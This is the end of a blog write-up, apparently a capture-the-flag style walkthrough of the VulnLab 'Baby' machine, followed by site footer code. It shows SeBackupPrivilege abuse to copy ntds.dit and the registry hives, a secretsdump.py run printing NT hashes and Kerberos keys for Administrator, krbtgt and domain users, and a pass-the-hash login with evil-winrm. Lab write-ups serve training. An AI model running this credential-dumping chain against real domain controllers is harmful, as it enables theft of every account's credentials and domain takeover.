+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\SeBackupPrivilegeUtils.dll</span><br><span class="line"><span class="built_in">Import-Module</span> .\SeBackupPrivilegeCmdLets.dll</span><br><span class="line"><span class="built_in">Copy-FileSeBackupPrivilege</span> Z:\Windows\NTDS\ntds.dit C:\mane\ntds.dit</span><br><span class="line"></span><br><span class="line">reg save HKLM\SYSTEM system</span><br><span class="line">reg save HKLM\SAM sam</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227221338-3vu2j2e.png" alt="image">​</p>
+<p>成功了之後會有三個文件：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227221404-60o46um.png" alt="image">​</p>
+<p>把他全部下載下來：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">download sam</span><br><span class="line">download system</span><br><span class="line">download ntds.dit</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227221644-vxz0d3n.png" alt="image">​</p>
+<p>使用 <code>secretsdump.py</code>​ 就得到了 管理員的hash：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> secretsdump.py <span class="literal">-sam</span> sam <span class="literal">-system</span> system <span class="literal">-ntds</span> ntds.dit local </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227221752-p5y0zlb.png" alt="image">​</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::                                                                                                                         </span><br><span class="line">Guest:<span class="number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                 </span><br><span class="line">BABYDC<span class="variable">$</span>:<span class="number">1000</span>:aad3b435b51404eeaad3b435b51404ee:a4a9bf1140055fbe906f911da8abf80f:::                                                                                                                              </span><br><span class="line">krbtgt:<span class="number">502</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">6</span>da4842e8c24b99ad21a92d620893884:::                </span><br></pre></td></tr></table></figure>
+
+<p>得到了之後就可以直接使用 <code>evil-winrm</code>​ 登錄:</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2024/12-vulnlab-baby/image-20241227222112-552orwt.png" alt="image">​</p>
+<p>然後完結。</p>
+<h1 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> secretsdump.py <span class="literal">-sam</span> sam <span class="literal">-system</span> system <span class="literal">-ntds</span> ntds.dit local</span><br><span class="line">Impacket v0.<span class="number">13.0</span>.dev0+<span class="number">20241127.154729</span>.af51dfd - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: <span class="number">0</span>x191d5d3fd5b0b51888453de8541d7e88</span><br><span class="line">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">8</span>d992faed38128ae85e95fa35868bb43:::</span><br><span class="line">Guest:<span class="number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:<span class="number">503</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[-] SAM hashes extraction <span class="keyword">for</span> user WDAGUtilityAccount failed. The account doesn<span class="string">&#x27;t have hash information.</span></span><br><span class="line"><span class="string">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span></span><br><span class="line"><span class="string">[*] Searching for pekList, be patient</span></span><br><span class="line"><span class="string">[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6</span></span><br><span class="line"><span class="string">[*] Reading and decrypting hashes from ntds.dit</span></span><br><span class="line"><span class="string">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::</span></span><br><span class="line"><span class="string">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span><br><span class="line"><span class="string">BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:a4a9bf1140055fbe906f911da8abf80f:::</span></span><br><span class="line"><span class="string">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::</span></span><br><span class="line"><span class="string">baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::</span></span><br><span class="line"><span class="string">baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::</span></span><br><span class="line"><span class="string">baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::</span></span><br><span class="line"><span class="string">baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::</span></span><br><span class="line"><span class="string">baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::</span></span><br><span class="line"><span class="string">baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::</span></span><br><span class="line"><span class="string">baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::</span></span><br><span class="line"><span class="string">baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::</span></span><br><span class="line"><span class="string">baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::</span></span><br><span class="line"><span class="string">baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:5fa67a134024d41bb4ff8bfd7da5e2b5:::</span></span><br><span class="line"><span class="string">[*] Kerberos keys from ntds.dit</span></span><br><span class="line"><span class="string">Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4</span></span><br><span class="line"><span class="string">Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d</span></span><br><span class="line"><span class="string">Administrator:des-cbc-md5:d38cb994ae806b97</span></span><br><span class="line"><span class="string">BABYDC$:aes256-cts-hmac-sha1-96:6dfa83d50096aab5a629ed3357465bf2748d119048f4249dd2722bdd5972c732</span></span><br><span class="line"><span class="string">BABYDC$:aes128-cts-hmac-sha1-96:6ee3b686283fbad581aec7aa83815b3e</span></span><br><span class="line"><span class="string">BABYDC$:des-cbc-md5:c819c4671c071c45</span></span><br><span class="line"><span class="string">krbtgt:aes256-cts-hmac-sha1-96:9c578fe1635da9e96eb60ad29e4e4ad90fdd471ea4dff40c0c4fce290a313d97</span></span><br><span class="line"><span class="string">krbtgt:aes128-cts-hmac-sha1-96:1541c9f79887b4305064ddae9ba09e14</span></span><br><span class="line"><span class="string">krbtgt:des-cbc-md5:d57383f1b3130de5</span></span><br><span class="line"><span class="string">baby.vl\Jacqueline.Barnett:aes256-cts-hmac-sha1-96:851185add791f50bcdc027e0a0385eadaa68ac1ca127180a7183432f8260e084</span></span><br><span class="line"><span class="string">baby.vl\Jacqueline.Barnett:aes128-cts-hmac-sha1-96:3abb8a49cf283f5b443acb239fd6f032</span></span><br><span class="line"><span class="string">baby.vl\Jacqueline.Barnett:des-cbc-md5:01df1349548a206b</span></span><br><span class="line"><span class="string">baby.vl\Ashley.Webb:aes256-cts-hmac-sha1-96:fc119502b9384a8aa6aff3ad659aa63bab9ebb37b87564303035357d10fa1039</span></span><br><span class="line"><span class="string">baby.vl\Ashley.Webb:aes128-cts-hmac-sha1-96:81f5f99fd72fadd005a218b96bf17528</span></span><br><span class="line"><span class="string">baby.vl\Ashley.Webb:des-cbc-md5:9267976186c1320e</span></span><br><span class="line"><span class="string">baby.vl\Hugh.George:aes256-cts-hmac-sha1-96:0ea359386edf3512d71d3a3a2797a75db3168d8002a6929fd242eb7503f54258</span></span><br><span class="line"><span class="string">baby.vl\Hugh.George:aes128-cts-hmac-sha1-96:50b966bdf7c919bfe8e85324424833dc</span></span><br><span class="line"><span class="string">baby.vl\Hugh.George:des-cbc-md5:296bec86fd323b3e</span></span><br><span class="line"><span class="string">baby.vl\Leonard.Dyer:aes256-cts-hmac-sha1-96:6d8fd945f9514fe7a8bbb11da8129a6e031fb504aa82ba1e053b6f51b70fdddd</span></span><br><span class="line"><span class="string">baby.vl\Leonard.Dyer:aes128-cts-hmac-sha1-96:35fd9954c003efb73ded2fde9fc00d5a</span></span><br><span class="line"><span class="string">baby.vl\Leonard.Dyer:des-cbc-md5:022313dce9a252c7</span></span><br><span class="line"><span class="string">baby.vl\Ian.Walker:aes256-cts-hmac-sha1-96:54affe14ed4e79d9c2ba61713ef437c458f1f517794663543097ff1c2ae8a784</span></span><br><span class="line"><span class="string">baby.vl\Ian.Walker:aes128-cts-hmac-sha1-96:78dbf35d77f29de5b7505ee88aef23df</span></span><br><span class="line"><span class="string">baby.vl\Ian.Walker:des-cbc-md5:bcb094c2012f914c</span></span><br><span class="line"><span class="string">baby.vl\Connor.Wilkinson:aes256-cts-hmac-sha1-96:55b0af76098dfe3731550e04baf1f7cb5b6da00de24c3f0908f4b2a2ea44475e</span></span><br><span class="line"><span class="string">baby.vl\Connor.Wilkinson:aes128-cts-hmac-sha1-96:9d4af8203b2f9e3ecf64c1cbbcf8616b</span></span><br><span class="line"><span class="string">baby.vl\Connor.Wilkinson:des-cbc-md5:fda762e362ab7ad3</span></span><br><span class="line"><span class="string">baby.vl\Joseph.Hughes:aes256-cts-hmac-sha1-96:2e5f25b14f3439bfc901d37f6c9e4dba4b5aca8b7d944957651655477d440d41</span></span><br><span class="line"><span class="string">baby.vl\Joseph.Hughes:aes128-cts-hmac-sha1-96:39fa92e8012f1b3f7be63c7ca9fd6723</span></span><br><span class="line"><span class="string">baby.vl\Joseph.Hughes:des-cbc-md5:02f1cd9e52e0f245</span></span><br><span class="line"><span class="string">baby.vl\Kerry.Wilson:aes256-cts-hmac-sha1-96:db5f7da80e369ee269cd5b0dbaea74bf7f7c4dfb3673039e9e119bd5518ea0fb</span></span><br><span class="line"><span class="string">baby.vl\Kerry.Wilson:aes128-cts-hmac-sha1-96:aebbe6f21c76460feeebea188affbe01</span></span><br><span class="line"><span class="string">baby.vl\Kerry.Wilson:des-cbc-md5:1f191c8c49ce07fe</span></span><br><span class="line"><span class="string">baby.vl\Teresa.Bell:aes256-cts-hmac-sha1-96:8bb9cf1637d547b31993d9b0391aa9f771633c8f2ed8dd7a71f2ee5b5c58fc84</span></span><br><span class="line"><span class="string">baby.vl\Teresa.Bell:aes128-cts-hmac-sha1-96:99bf021e937e1291cc0b6e4d01d96c66</span></span><br><span class="line"><span class="string">baby.vl\Teresa.Bell:des-cbc-md5:4cbcdc3de6b50ee9</span></span><br><span class="line"><span class="string">baby.vl\Caroline.Robinson:aes256-cts-hmac-sha1-96:6fe5d46e01d6cf9909f479fb4d7afac0bd973981dd958e730a734aa82c9e13af</span></span><br><span class="line"><span class="string">baby.vl\Caroline.Robinson:aes128-cts-hmac-sha1-96:f34e6c0c8686a46eea8fd15a361601f9</span></span><br><span class="line"><span class="string">baby.vl\Caroline.Robinson:des-cbc-md5:fd40190d579138df</span></span><br><span class="line"><span class="string">[*] Cleaning up...</span></span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/12/28/2024/1228-vulnlab-baby/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/12/28/2024/1228-vulnlab-baby/&text=VulnLab - Machine - Baby"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/12/28/2024/1228-vulnlab-baby/&title=VulnLab - Machine - Baby"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/12/28/2024/1228-vulnlab-baby/&is_video=false&description=VulnLab - Machine - Baby"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnLab - Machine - Baby&body=Check out this article: https://manesec.github.io/2024/12/28/2024/1228-vulnlab-baby/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/12/28/2024/1228-vulnlab-baby/&title=VulnLab - Machine - Baby"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/12/28/2024/1228-vulnlab-baby/&title=VulnLab - Machine - Baby"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/12/28/2024/1228-vulnlab-baby/&title=VulnLab - Machine - Baby"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/12/28/2024/1228-vulnlab-baby/&title=VulnLab - Machine - Baby"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/12/28/2024/1228-vulnlab-baby/&name=VulnLab - Machine - Baby&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/12/28/2024/1228-vulnlab-baby/&t=VulnLab - Machine - Baby"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
